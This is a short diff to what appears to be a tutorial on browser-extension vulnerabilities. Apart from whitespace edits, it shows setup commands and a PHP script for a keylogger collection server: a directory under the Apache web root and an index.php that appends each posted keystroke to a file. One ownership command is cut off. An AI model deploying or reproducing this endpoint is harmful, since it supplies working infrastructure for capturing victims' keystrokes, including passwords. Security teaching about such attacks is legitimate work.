@@ -15,9 +15,10 @@ Vulnerabilities in browser extensions put users at risk by providing a way for w
            - sudo service apache2 start      
            - cd /var/www/html    
            - sudo mkdir keylogger    
-           - cd keylogger
-           - nano index.php
-             <?php    
+           - cd keylogger    
+           - nano index.php 
+              
+             <?php        
               if(!isset($_POST['key'])){ ### Authenticate input      
                       echo("Access Denied!");    
                       exit(0);    
@@ -29,7 +30,8 @@ Vulnerabilities in browser extensions put users at risk by providing a way for w
               }    
               fwrite($file,$_POST['key']);     
               fclose($file);     
-              echo('char saved!');     
+              echo('char saved!');   
+                     
             - cd ..     
             - cd ..      
             - -hR www-data:www-data html     
